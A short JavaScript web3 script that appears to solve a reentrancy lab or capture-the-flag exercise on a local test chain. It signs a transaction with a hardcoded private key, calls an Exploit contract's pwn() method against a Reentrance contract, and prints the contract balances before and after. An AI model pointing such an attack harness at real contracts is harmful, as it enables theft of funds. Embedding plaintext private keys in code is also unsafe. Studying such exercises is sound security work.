// @format

const Web3 = require('web3');
const Tx = require('ethereumjs-tx');
const BigNumber = require('bignumber.js');

const exploit = require('./build/contracts/Exploit.json');
const reentrance = require('./build/contracts/Reentrance.json');

(async function pwn() {
  // Note that we're not using the deployment keys of the truffle here.
  var privateKey =
    'a3ade3bffea3a3af6c4fdcb7305a3f26a2baff5b97e2f061fadebb9215b6460b';
  var publicKey = '0x03e2edce4bb10110c3b75d14737100c0c34f7199';

  const provider = new Web3.providers.HttpProvider('http://localhost:8545');
  const web3 = new Web3(provider);
  const networkId = await web3.eth.net.getId();
  const exploitAddress = exploit.networks[networkId].address;
  const exploitContract = new web3.eth.Contract(exploit.abi, exploitAddress);
  const reentranceAddress = reentrance.networks[networkId].address;
  const reentranceContract = new web3.eth.Contract(
    reentrance.abi,
    reentranceAddress,
  );

  let balance = await web3.eth.getBalance(reentranceAddress);
  console.log('Balance of Reentrance contract:', balance);

  const method = exploitContract.methods.pwn();
  const count = await web3.eth.getTransactionCount(publicKey);
  const rawTx = {
    from: publicKey,
    to: exploitAddress,
    nonce: web3.utils.toHex(count),
    gasPrice: web3.utils.toHex(web3.utils.toWei('21', 'gwei')),
    gasLimit: web3.utils.toHex(await method.estimateGas({from: publicKey})),
    value: web3.utils.toHex(web3.utils.toWei('0.2', 'ether')),
    data: method.encodeABI(),
  };
  var tx = new Tx(rawTx);
  tx.sign(Buffer.from(privateKey, 'hex'));
  console.log("Pwning contract with reentrancy attack");
  await web3.eth.sendSignedTransaction('0x' + tx.serialize().toString('hex'));

  balance = await web3.eth.getBalance(reentranceAddress);
  console.log('Balance of Reentrance contract:', balance);

  balanceExploit = await web3.eth.getBalance(exploitAddress);
  console.log('Balance of Exploit contract:', balanceExploit);
})();
